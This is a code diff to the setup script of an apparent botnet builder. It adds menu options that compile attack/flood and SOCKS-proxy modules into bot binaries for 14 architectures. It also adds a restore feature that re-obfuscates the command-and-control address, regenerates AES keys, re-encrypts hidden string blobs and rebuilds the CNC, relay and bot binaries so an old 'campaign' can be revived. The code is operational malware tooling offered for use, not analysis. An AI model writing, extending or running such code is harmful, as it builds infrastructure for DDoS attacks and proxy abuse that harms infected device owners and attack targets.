@@ -496,6 +496,43 @@ def update_bot_debug_mode(bot_path: str, debug_enabled: bool) -> bool:
         return False
 
 
+def caps_to_build_tags(cap_attacks: bool, cap_socks: bool) -> str:
+    """Convert capability choices to Go build tags for the bot binary."""
+    tags = []
+    if cap_attacks:
+        tags.append("withattacks")
+    if cap_socks:
+        tags.append("withsocks")
+    return ",".join(tags)
+
+
+def prompt_capabilities() -> tuple:
+    """Prompt user to choose which modules to include in the bot build."""
+    print(f"\n{Colors.BRIGHT_CYAN}⚙  Bot Module Selection{Colors.RESET}")
+    print(f"{Colors.DIM}   Choose which capabilities to compile into bot binaries.{Colors.RESET}")
+    print(f"{Colors.DIM}   Disabling a module removes its code paths from the bot.{Colors.RESET}\n")
+
+    print(f"  {Colors.BRIGHT_RED}[1]{Colors.RESET} {Colors.BRIGHT_WHITE}Full (attacks + SOCKS){Colors.RESET}  — all modules enabled")
+    print(f"  {Colors.BRIGHT_YELLOW}[2]{Colors.RESET} {Colors.BRIGHT_WHITE}Attacks only{Colors.RESET}          — no SOCKS proxy module")
+    print(f"  {Colors.BRIGHT_BLUE}[3]{Colors.RESET} {Colors.BRIGHT_WHITE}SOCKS only{Colors.RESET}             — no attack/flood module")
+    print(f"  {Colors.DIM}[4]{Colors.RESET} {Colors.DIM}None{Colors.RESET}                    — shell/management only\n")
+
+    choice = prompt("Select module profile", "1")
+    if choice == "2":
+        cap_attacks, cap_socks = True, False
+        success("Module profile: Attacks only")
+    elif choice == "3":
+        cap_attacks, cap_socks = False, True
+        success("Module profile: SOCKS only")
+    elif choice == "4":
+        cap_attacks, cap_socks = False, False
+        warning("Module profile: None (shell/management only)")
+    else:
+        cap_attacks, cap_socks = True, True
+        success("Module profile: Full (attacks + SOCKS)")
+    return cap_attacks, cap_socks
+
+
 def prompt_debug_mode() -> bool:
     """Prompt user to set debug mode with explanation"""
     print(f"\n{Colors.BRIGHT_CYAN}🔧 Debug Mode{Colors.RESET}")
@@ -726,11 +763,14 @@ def build_cnc(cnc_path: str) -> bool:
     try:
         go = find_go()
         info(f"Building CNC server... ({go})")
+        env = dict(os.environ)
+        env["CGO_ENABLED"] = "0"
         result = subprocess.run(
             [go, "build", "-ldflags=-s -w", "-o", "cnc", "."],
             cwd=cnc_path,
             capture_output=True,
             text=True,
+            env=env,
         )
 
         if result.returncode != 0:
@@ -756,6 +796,8 @@ def build_relay(base_path: str) -> bool:
         go = find_go()
         info(f"Building relay server... ({go})")
         relay_path = os.path.join(base_path, "cnc", "relay")
+        env = dict(os.environ)
+        env["CGO_ENABLED"] = "0"
         result = subprocess.run(
             [
                 go,
@@ -769,6 +811,7 @@ def build_relay(base_path: str) -> bool:
             cwd=relay_path,
             capture_output=True,
             text=True,
+            env=env,
         )
 
         if result.returncode != 0:
@@ -787,7 +830,7 @@ def build_relay(base_path: str) -> bool:
         return False
 
 
-def build_bots(base_path: str) -> bool:
+def build_bots(base_path: str, build_tags: str = "") -> bool:
     """Build bot binaries using tools/build.sh from project root"""
     try:
         build_script = os.path.join(base_path, "tools", "build.sh")
@@ -799,7 +842,12 @@ def build_bots(base_path: str) -> bool:
         info("This may take a few minutes...")
         print()
 
-        result = subprocess.run(["bash", build_script], cwd=base_path, text=True)
+        env = dict(os.environ)
+        if build_tags:
+            env["BOT_BUILD_TAGS"] = build_tags
+            info(f"Build tags: {build_tags}")
+
+        result = subprocess.run(["bash", build_script], cwd=base_path, text=True, env=env)
 
         return result.returncode == 0
     except Exception as e:
@@ -829,6 +877,14 @@ def save_config(base_path: str, config: dict):
         f.write(f"Protocol Version: {config['protocol_version']}\n")
         f.write(f"Crypt Seed: {config['crypt_seed']}\n")
         f.write(f"Obfuscated C2: {config['obfuscated_c2']}\n\n")
+
+        f.write("[Proxy]\n")
+        f.write(f"Proxy User: {config.get('proxy_user', '')}\n")
+        f.write(f"Proxy Pass: {config.get('proxy_pass', '')}\n\n")
+
+        f.write("[Modules]\n")
+        f.write(f"Attacks: {'true' if config.get('cap_attacks', True) else 'false'}\n")
+        f.write(f"Socks: {'true' if config.get('cap_socks', True) else 'false'}\n\n")
 
         f.write("[Certificate]\n")
         f.write(f"Country: {config['cert']['country']}\n")
@@ -1001,19 +1057,37 @@ def print_menu():
         f"{Colors.BRIGHT_CYAN}║{Colors.RESET}                                                              {Colors.BRIGHT_CYAN}║{Colors.RESET}"
     )
     print(
-        f"{Colors.BRIGHT_CYAN}║{Colors.RESET}  {Colors.BRIGHT_MAGENTA}[3]{Colors.RESET} {Colors.BRIGHT_WHITE}Relay Endpoints Update{Colors.RESET}                                {Colors.BRIGHT_CYAN}║{Colors.RESET}"
+        f"{Colors.BRIGHT_CYAN}║{Colors.RESET}  {Colors.BRIGHT_MAGENTA}[3]{Colors.RESET} {Colors.BRIGHT_WHITE}Module Update & Rebuild{Colors.RESET}                               {Colors.BRIGHT_CYAN}║{Colors.RESET}"
     )
     print(
-        f"{Colors.BRIGHT_CYAN}║{Colors.RESET}      {Colors.MAGENTA}├─{Colors.RESET} Add, change, or remove relay endpoints             {Colors.BRIGHT_CYAN}║{Colors.RESET}"
+        f"{Colors.BRIGHT_CYAN}║{Colors.RESET}      {Colors.MAGENTA}├─{Colors.RESET} Enable or disable attacks / SOCKS modules          {Colors.BRIGHT_CYAN}║{Colors.RESET}"
     )
     print(
         f"{Colors.BRIGHT_CYAN}║{Colors.RESET}      {Colors.MAGENTA}├─{Colors.RESET} Keep existing C2, magic code & certificates        {Colors.BRIGHT_CYAN}║{Colors.RESET}"
     )
     print(
-        f"{Colors.BRIGHT_CYAN}║{Colors.RESET}      {Colors.MAGENTA}└─{Colors.RESET} Rebuild bot binaries only                         {Colors.BRIGHT_CYAN}║{Colors.RESET}"
+        f"{Colors.BRIGHT_CYAN}║{Colors.RESET}      {Colors.MAGENTA}└─{Colors.RESET} Rebuild bot binaries with new module flags         {Colors.BRIGHT_CYAN}║{Colors.RESET}"
     )
     print(
-        f"{Colors.BRIGHT_CYAN}║{Colors.RESET}      {Colors.DIM}Best for: Adding/changing backconnect relay servers{Colors.RESET}      {Colors.BRIGHT_CYAN}║{Colors.RESET}"
+        f"{Colors.BRIGHT_CYAN}║{Colors.RESET}      {Colors.DIM}Best for: Switching between full/atk-only/socks-only{Colors.RESET}    {Colors.BRIGHT_CYAN}║{Colors.RESET}"
+    )
+    print(
+        f"{Colors.BRIGHT_CYAN}║{Colors.RESET}                                                              {Colors.BRIGHT_CYAN}║{Colors.RESET}"
+    )
+    print(
+        f"{Colors.BRIGHT_CYAN}║{Colors.RESET}  {Colors.BRIGHT_GREEN}[4]{Colors.RESET} {Colors.BRIGHT_WHITE}Restore from setup_config.txt{Colors.RESET}                        {Colors.BRIGHT_CYAN}║{Colors.RESET}"
+    )
+    print(
+        f"{Colors.BRIGHT_CYAN}║{Colors.RESET}      {Colors.GREEN}├─{Colors.RESET} Re-apply saved C2, tokens, proxy & module flags   {Colors.BRIGHT_CYAN}║{Colors.RESET}"
+    )
+    print(
+        f"{Colors.BRIGHT_CYAN}║{Colors.RESET}      {Colors.GREEN}├─{Colors.RESET} Generates fresh AES key, re-encrypts blobs        {Colors.BRIGHT_CYAN}║{Colors.RESET}"
+    )
+    print(
+        f"{Colors.BRIGHT_CYAN}║{Colors.RESET}      {Colors.GREEN}└─{Colors.RESET} Rebuild all binaries                               {Colors.BRIGHT_CYAN}║{Colors.RESET}"
+    )
+    print(
+        f"{Colors.BRIGHT_CYAN}║{Colors.RESET}      {Colors.DIM}Best for: After git pull, want old campaign back{Colors.RESET}        {Colors.BRIGHT_CYAN}║{Colors.RESET}"
     )
     print(
         f"{Colors.BRIGHT_CYAN}║{Colors.RESET}                                                              {Colors.BRIGHT_CYAN}║{Colors.RESET}"
@@ -1053,6 +1127,12 @@ def run_full_setup(base_path: str, cnc_path: str, bot_path: str):
         warning("Debug mode ENABLED - remember to disable for production!")
     else:
         success("Debug mode disabled - ready for production")
+    print()
+
+    # Bot Module Selection
+    cap_attacks, cap_socks = prompt_capabilities()
+    config["cap_attacks"] = cap_attacks
+    config["cap_socks"] = cap_socks
     print()
 
     # Step 1: C2 Address
@@ -1197,6 +1277,10 @@ def run_full_setup(base_path: str, cnc_path: str, bot_path: str):
     else:
         warning("Failed to set debug mode")
 
+    atk_s = "ON" if config["cap_attacks"] else "OFF"
+    socks_s = "ON" if config["cap_socks"] else "OFF"
+    success(f"Bot modules: attacks={atk_s}, socks={socks_s}")
+
     # Relay endpoints are now managed at runtime via the CNC dashboard (cnc/db/relays.json)
 
     # Update default proxy credentials (bot + CNC)
@@ -1222,7 +1306,8 @@ def run_full_setup(base_path: str, cnc_path: str, bot_path: str):
     if confirm(
         "Would you like to build bot binaries? (14 architectures, takes a few mins)"
     ):
-        if build_bots(base_path):
+        build_tags = caps_to_build_tags(config["cap_attacks"], config["cap_socks"])
+        if build_bots(base_path, build_tags):
             success("Bot binaries built")
         else:
             warning("Bot build had issues - check bins/")
@@ -1244,6 +1329,10 @@ def run_c2_update(base_path: str, cnc_path: str, bot_path: str):
         warning("Debug mode ENABLED - remember to disable for production!")
     else:
         success("Debug mode disabled - ready for production")
+    print()
+
+    # Bot Module Selection
+    cap_attacks, cap_socks = prompt_capabilities()
     print()
 
     # Get existing config
@@ -1348,6 +1437,10 @@ def run_c2_update(base_path: str, cnc_path: str, bot_path: str):
     else:
         warning("Failed to set debug mode")
 
+    atk_s = "ON" if cap_attacks else "OFF"
+    socks_s = "ON" if cap_socks else "OFF"
+    success(f"Bot modules: attacks={atk_s}, socks={socks_s}")
+
     if confirm("Would you like to build the relay server?"):
         if build_relay(base_path):
             success("Relay server built")
@@ -1355,7 +1448,8 @@ def run_c2_update(base_path: str, cnc_path: str, bot_path: str):
             warning("Relay build failed - build manually with: go build -o relay ./cnc/relay")
 
     if confirm("Would you like to build bot binaries? (takes a few mins)"):
-        if build_bots(base_path):
+        build_tags = caps_to_build_tags(cap_attacks, cap_socks)
+        if build_bots(base_path, build_tags):
             success("Bot binaries built")
         else:
             warning("Bot build had issues - check bins/")
@@ -1382,49 +1476,131 @@ def run_c2_update(base_path: str, cnc_path: str, bot_path: str):
     print()
 
 
-def run_relay_update(base_path: str, cnc_path: str, bot_path: str):
-    """Update relay endpoints only - keep existing C2, magic code, certs"""
+def run_module_update(base_path: str, cnc_path: str, bot_path: str):
+    """Change which modules are compiled into bot binaries and rebuild."""
 
-    # Get existing config
-    info("Reading existing configuration...")
-    existing = get_current_config(bot_path, cnc_path)
+    print_step(1, 2, "Module Selection")
+    cap_attacks, cap_socks = prompt_capabilities()
+    print()
 
-    if not existing.get("magic_code") or not existing.get("crypt_seed"):
-        error("Could not read existing configuration!")
-        error("Please run Full Setup first.")
+    print_step(2, 2, "Build")
+    print(f"{Colors.DIM}   C2, magic code, certs — all unchanged.{Colors.RESET}\n")
+
+    if confirm("Would you like to build bot binaries? (14 architectures, takes a few mins)"):
+        build_tags = caps_to_build_tags(cap_attacks, cap_socks)
+        if build_bots(base_path, build_tags):
+            success("Bot binaries built")
+        else:
+            warning("Bot build had issues - check bins/")
+    else:
+        atk_s = "ON" if cap_attacks else "OFF"
+        socks_s = "ON" if cap_socks else "OFF"
+        info(f"Skipped build — to build manually: BOT_BUILD_TAGS={caps_to_build_tags(cap_attacks, cap_socks)} bash tools/build.sh")
+
+    print(f"\n{Colors.BRIGHT_GREEN}{'═' * 60}{Colors.RESET}")
+    print(f"{Colors.BRIGHT_GREEN}{Colors.BOLD}  ✓ MODULE UPDATE COMPLETE!{Colors.RESET}")
+    print(f"{Colors.BRIGHT_GREEN}{'═' * 60}{Colors.RESET}\n")
+    atk_s = "ON" if cap_attacks else "OFF"
+    socks_s = "ON" if cap_socks else "OFF"
+    print(f"  {Colors.YELLOW}Attacks:{Colors.RESET}      {Colors.BRIGHT_WHITE}{atk_s}{Colors.RESET}")
+    print(f"  {Colors.YELLOW}SOCKS:{Colors.RESET}        {Colors.BRIGHT_WHITE}{socks_s}{Colors.RESET}")
+    print(f"  {Colors.YELLOW}C2 / Tokens:{Colors.RESET}  {Colors.BRIGHT_WHITE}(unchanged){Colors.RESET}")
+    print()
+    warning("Deploy new bot binaries from bins/")
+    warning("Existing bots will NOT auto-update - redeploy required")
+    print()
+
+
+def parse_setup_config(config_path: str) -> dict:
+    """Parse setup_config.txt and return a dict of all saved values."""
+    config = {}
+    try:
+        with open(config_path, "r") as f:
+            for line in f:
+                line = line.strip()
+                if ": " not in line:
+                    continue
+                key, _, value = line.partition(": ")
+                key = key.strip()
+                value = value.strip()
+                if key == "C2 Address":
+                    config["c2_address"] = value
+                elif key == "Admin Port":
+                    config["admin_port"] = value
+                elif key == "Magic Code":
+                    config["magic_code"] = value
+                elif key == "Protocol Version":
+                    config["protocol_version"] = value
+                elif key == "Crypt Seed":
+                    config["crypt_seed"] = value
+                elif key == "Obfuscated C2":
+                    config["obfuscated_c2"] = value
+                elif key == "Proxy User":
+                    config["proxy_user"] = value
+                elif key == "Proxy Pass":
+                    config["proxy_pass"] = value
+                elif key == "Attacks":
+                    config["cap_attacks"] = value.lower() == "true"
+                elif key == "Socks":
+                    config["cap_socks"] = value.lower() == "true"
+                elif key == "Country":
+                    config.setdefault("cert", {})["country"] = value
+                elif key == "State":
+                    config.setdefault("cert", {})["state"] = value
+                elif key == "City":
+                    config.setdefault("cert", {})["city"] = value
+                elif key == "Organization":
+                    config.setdefault("cert", {})["org"] = value
+                elif key == "Common Name":
+                    config.setdefault("cert", {})["cn"] = value
+                elif key == "Valid Days":
+                    config.setdefault("cert", {})["days"] = int(value)
+    except Exception as e:
+        error(f"Failed to parse setup_config.txt: {e}")
+    return config
+
+
+def run_restore(base_path: str, cnc_path: str, bot_path: str):
+    """Restore a previous setup from setup_config.txt — re-patches all source with saved values."""
+    config_path = os.path.join(base_path, "setup_config.txt")
+
+    if not os.path.exists(config_path):
+        error("setup_config.txt not found in project root.")
+        error("Run a Full Setup first to generate it.")
+        return
+
+    info(f"Reading saved config from: {config_path}")
+    config = parse_setup_config(config_path)
+
+    required = ["c2_address", "admin_port", "magic_code", "protocol_version", "crypt_seed"]
+    missing = [k for k in required if not config.get(k)]
+    if missing:
+        error(f"setup_config.txt is missing required fields: {', '.join(missing)}")
+        error("The file may be from an older version that didn't save all fields.")
         return
 
     print()
-    info(
-        f"Current Magic Code: {Colors.BRIGHT_WHITE}{existing.get('magic_code', 'N/A')}{Colors.RESET}"
-    )
-    info(
-        f"Current Crypt Seed: {Colors.BRIGHT_WHITE}{existing.get('crypt_seed', 'N/A')}{Colors.RESET}"
-    )
-
-    info("Relay endpoints are managed at runtime via the CNC dashboard — no baking required")
+    print(f"{Colors.BRIGHT_CYAN}  Restoring from saved config:{Colors.RESET}")
+    print(f"  {Colors.YELLOW}C2 Address:{Colors.RESET}       {Colors.BRIGHT_WHITE}{config['c2_address']}{Colors.RESET}")
+    print(f"  {Colors.YELLOW}Admin Port:{Colors.RESET}       {Colors.BRIGHT_WHITE}{config['admin_port']}{Colors.RESET}")
+    print(f"  {Colors.YELLOW}Magic Code:{Colors.RESET}       {Colors.BRIGHT_WHITE}{config['magic_code']}{Colors.RESET}")
+    print(f"  {Colors.YELLOW}Protocol:{Colors.RESET}         {Colors.BRIGHT_WHITE}{config['protocol_version']}{Colors.RESET}")
+    print(f"  {Colors.YELLOW}Crypt Seed:{Colors.RESET}       {Colors.BRIGHT_WHITE}{config['crypt_seed']}{Colors.RESET}")
+    proxy_u = config.get("proxy_user", "(not saved)")
+    proxy_p = config.get("proxy_pass", "(not saved)")
+    print(f"  {Colors.YELLOW}Proxy Auth:{Colors.RESET}       {Colors.BRIGHT_WHITE}{proxy_u}:{proxy_p}{Colors.RESET}")
+    atk_s = "ON" if config.get("cap_attacks", True) else "OFF"
+    socks_s = "ON" if config.get("cap_socks", True) else "OFF"
+    print(f"  {Colors.YELLOW}Bot modules:{Colors.RESET}      {Colors.BRIGHT_WHITE}attacks={atk_s}, socks={socks_s}{Colors.RESET}")
     print()
 
-    # Show current proxy credentials
-    current_user_match = re.search(r'var proxyUser\s*=\s*"([^"]*)"', content)
-    current_pass_match = re.search(r'var proxyPass\s*=\s*"([^"]*)"', content)
-    current_user = current_user_match.group(1) if current_user_match else "vision"
-    current_pass = current_pass_match.group(1) if current_pass_match else "vision"
+    if not confirm("Apply this config and rebuild?"):
+        return
 
-    print(
-        f"\n{Colors.DIM}   Default SOCKS5 credentials — users connect with relay:port:user:pass{Colors.RESET}\n"
-    )
-    proxy_user = prompt("Proxy username", current_user)
-    proxy_pass = prompt("Proxy password", current_pass)
-    success(f"Proxy auth: {proxy_user}:{proxy_pass}")
-
-    # Step 2: Update & Build
-    print_step(2, 2, "Update & Build")
-
-    print(f"{Colors.DIM}   Re-encrypting relay config with fresh AES key...{Colors.RESET}\n")
-
-    # Generate new AES key
+    # Step 1: Fresh AES key (git pull resets opsec.go to repo state)
+    print_step(1, 3, "Generating Fresh AES Key")
     opsec_path = os.path.join(bot_path, "opsec.go")
+    config_go_path = os.path.join(bot_path, "config.go")
     crypto_path = os.path.join(base_path, "tools", "crypto.go")
     old_key = read_current_key(opsec_path)
     new_key, new_pairs = generate_random_key()
@@ -1433,59 +1609,72 @@ def run_relay_update(base_path: str, cnc_path: str, bot_path: str):
         patch_crypto_tool_key(crypto_path, new_pairs)
     success(f"AES key randomized ({new_key.hex()[:16]}...)")
 
-    # Re-encrypt all existing blobs with new key
+    # Re-encrypt existing blobs with new key before writing new values
     encrypt_config_blobs(config_go_path, old_key, new_key)
-    success("Sensitive string blobs re-encrypted")
+    success("Existing blobs re-encrypted")
 
-    # Patch relay binary auth key
-    update_relay_config(base_path, existing["magic_code"])
-    success("Relay auth key synced")
+    # Step 2: Patch source files
+    print_step(2, 3, "Patching Source Files")
 
-    # Patch proxy credentials (bot + CNC)
-    update_proxy_credentials(bot_path, proxy_user, proxy_pass)
-    update_cnc_proxy_credentials(cnc_path, proxy_user, proxy_pass)
-    success(f"Proxy credentials: {proxy_user}:{proxy_pass}")
+    # Re-obfuscate C2 using stored seed + new key
+    c2_address = config["c2_address"]
+    crypt_seed = config["crypt_seed"]
+    obfuscated_c2 = obfuscate_c2(c2_address, crypt_seed)
 
-    # Offer to rebuild
+    if not verify_obfuscation(obfuscated_c2, crypt_seed, c2_address):
+        error("C2 obfuscation verification failed!")
+        sys.exit(1)
+    success("C2 address re-obfuscated and verified ✓")
+
+    if update_cnc_main_go(cnc_path, config["magic_code"], config["protocol_version"], config["admin_port"]):
+        success("CNC configured")
+    else:
+        error("Failed to update CNC")
+
+    update_relay_config(base_path, config["magic_code"])
+    success("Relay configured")
+
+    if update_bot_main_go(bot_path, config["magic_code"], config["protocol_version"], obfuscated_c2, crypt_seed):
+        success("Bot configured")
+    else:
+        error("Failed to update Bot")
+
+    if config.get("proxy_user") and config.get("proxy_pass"):
+        update_proxy_credentials(bot_path, config["proxy_user"], config["proxy_pass"])
+        update_cnc_proxy_credentials(cnc_path, config["proxy_user"], config["proxy_pass"])
+        success(f"Proxy credentials restored: {config['proxy_user']}:{config['proxy_pass']}")
+    else:
+        warning("Proxy credentials not found in setup_config.txt — skipping (run !socksauth to set them)")
+
+    # Step 3: Build
+    print_step(3, 3, "Building Binaries")
+
+    if confirm("Would you like to build the CNC server?"):
+        if build_cnc(cnc_path):
+            success("CNC server built")
+        else:
+            warning("CNC build failed - build manually with: cd cnc && go build")
+
     if confirm("Would you like to build the relay server?"):
         if build_relay(base_path):
             success("Relay server built")
         else:
-            warning("Relay build failed - build manually with: go build -o relay ./cnc/relay")
+            warning("Relay build failed")
 
-    if confirm("Would you like to build bot binaries? (takes a few mins)"):
-        if build_bots(base_path):
+    if confirm("Would you like to build bot binaries? (14 architectures, takes a few mins)"):
+        build_tags = caps_to_build_tags(config.get("cap_attacks", True), config.get("cap_socks", True))
+        if build_bots(base_path, build_tags):
             success("Bot binaries built")
         else:
             warning("Bot build had issues - check bins/")
 
-    # Summary
     print(f"\n{Colors.BRIGHT_GREEN}{'═' * 60}{Colors.RESET}")
-    print(
-        f"{Colors.BRIGHT_GREEN}{Colors.BOLD}  ✓ RELAY ENDPOINTS UPDATED!{Colors.RESET}"
-    )
+    print(f"{Colors.BRIGHT_GREEN}{Colors.BOLD}  ✓ RESTORE COMPLETE!{Colors.RESET}")
     print(f"{Colors.BRIGHT_GREEN}{'═' * 60}{Colors.RESET}\n")
-
-    print(
-        f"  {Colors.YELLOW}Relay Endpoints:{Colors.RESET}  {Colors.DIM}managed via CNC dashboard (cnc/db/relays.json){Colors.RESET}"
-    )
-    print(
-        f"  {Colors.YELLOW}Proxy Auth:{Colors.RESET}      {Colors.BRIGHT_WHITE}{proxy_user}:{proxy_pass}{Colors.RESET}"
-    )
-    print(
-        f"  {Colors.YELLOW}C2 Address:{Colors.RESET}      {Colors.BRIGHT_WHITE}(unchanged){Colors.RESET}"
-    )
-    print(
-        f"  {Colors.YELLOW}Magic Code:{Colors.RESET}      {Colors.BRIGHT_WHITE}(unchanged){Colors.RESET}"
-    )
-    print(
-        f"  {Colors.YELLOW}Certificates:{Colors.RESET}    {Colors.BRIGHT_WHITE}(unchanged){Colors.RESET}"
-    )
+    print(f"  {Colors.YELLOW}C2 Address:{Colors.RESET}  {Colors.BRIGHT_WHITE}{c2_address}{Colors.RESET}")
+    print(f"  {Colors.YELLOW}Magic Code:{Colors.RESET}  {Colors.BRIGHT_WHITE}{config['magic_code']}{Colors.RESET}")
     print()
-    info(f"Start relay with: ./relay -name <id> -c2 https://<cnc>/api/relay-report -key {existing.get('magic_code', '<magic_code>')}")
-    info(f"Connect with: curl --socks5 <relay>:1080 -U {proxy_user}:{proxy_pass} http://target")
-    warning("Deploy new bot binaries from bins/")
-    warning("Existing bots will NOT auto-update - redeploy required")
+    warning("Deploy new bot binaries from bins/ — existing bots will NOT auto-update")
     print()
 
 
@@ -1515,8 +1704,11 @@ def main():
         info("Starting C2 URL Update...")
         run_c2_update(base_path, cnc_path, bot_path)
     elif choice == "3":
-        info("Starting Relay Endpoints Update...")
-        run_relay_update(base_path, cnc_path, bot_path)
+        info("Starting Module Update...")
+        run_module_update(base_path, cnc_path, bot_path)
+    elif choice == "4":
+        info("Restoring from setup_config.txt...")
+        run_restore(base_path, cnc_path, bot_path)
     elif choice == "0":
         print("\nExiting.")
         sys.exit(0)
